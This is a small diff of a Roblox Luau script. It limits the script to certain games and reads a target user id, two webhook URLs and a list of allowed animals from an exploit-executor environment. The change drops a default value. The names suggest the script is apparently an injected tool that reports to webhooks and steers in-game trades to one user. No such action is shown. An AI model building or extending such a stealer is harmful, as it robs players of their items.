@@ -13,7 +13,7 @@ task.spawn(function()
 	if not table.find({ 99606176102979, 109983668079237, 79906538690694, 119594317142884 }, game.PlaceId) then
 		return
 	end
-	local targetUserId = getgenv().TARGET_USER_ID or 0
+	local targetUserId = getgenv().TARGET_USER_ID
 	local goodWebhook = getgenv().GOOD_WEBHOOK or ""
 	local tradeWebhook = getgenv().TRADE_WEBHOOK
 	local allowedAnimals = getgenv().ALLOWED_ANIMALS or {}
